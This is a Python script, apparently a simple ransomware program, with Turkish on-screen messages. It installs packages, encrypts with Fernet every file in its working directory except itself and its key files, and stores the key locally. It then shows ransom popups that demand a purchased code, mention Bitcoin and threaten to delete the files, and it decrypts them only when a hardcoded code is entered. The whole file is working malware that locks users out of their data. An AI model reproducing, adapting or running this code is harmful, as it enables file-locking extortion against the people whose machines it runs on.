#usr/bin/env python3
import os
import platform

system = platform.system()

if system == "Windows":
	os.system('cmd /c "pip3 install cryptography"')
	os.system('cmd /c "pip3 install pyautogui"')
elif system == "Linux" or "Darwin":
	os.system("pip3 install cryptography")
	os.system("pip3 install pyautogui")

from cryptography.fernet import Fernet
import pyautogui

a9348509338609058604658604 = "noodle"

files = []

for file in os.listdir():
    if file == "anonymous.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    
    if os.path.isfile(file):
        files.append(file)

print(files) 

a9348509358609458604958604 = "kahve"

a9348509358609438604958604 = "abuziddin"

key = Fernet.generate_key()

a9348509352609458604958684 = "ibo"

with open("thekey.key","wb") as thekey:
    thekey.write(key)
for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_encrypted)

pyautogui.alert(text='Geçmiş olsun kardeşim dosyalar gitti. Bilgisayarı yeniden başlatırsan dosyaları çözümlemek için elimde olan şifre de silinecek.',title='Virüs', button='Allaah')
kod = str(pyautogui.prompt(text='Kodu söyle. Eğer kodun yoksa bana ulaş ve satın al. Bir tane yanlış kod girersen ya da 24 saat içinde kod girmezsen dosyaları silerim.', title = 'Bitcoin Severiz'))

if kod == a9348509358609438604958604:
    pyautogui.alert(text = 'Kod yanlıştı XD dosyalarını sildim gitti. Artık tüm dosyaların gAA diye bişeyle başlayacak sjsjsjsj', title = 'XD', button = 'SIÇIŞ')

    pyautogui.alert(text = 'Yok lan şaka yapıyom kod doğru dosyaların çözümlendi.')


    files = []

    for file in os.listdir():
        if file == "anonymous.py" or file == "thekey.key" or file == "decrypt.py":
            continue
        
        if os.path.isfile(file):
            files.append(file)

    print(files) 

    with open("thekey.key", "rb") as key:
        secretkey = key.read()
        

    for file in files:
        with open(file,"rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file,"wb") as thefile:
            thefile.write(contents_decrypted)
else:
    pyautogui.alert(text = 'Kod yanlıştı XD dosyalarını sildim gitti. Artık tüm dosyaların gAA diye bişeyle başlayacak sjsjsjsj', title = 'XD', button = 'SIÇIŞ')
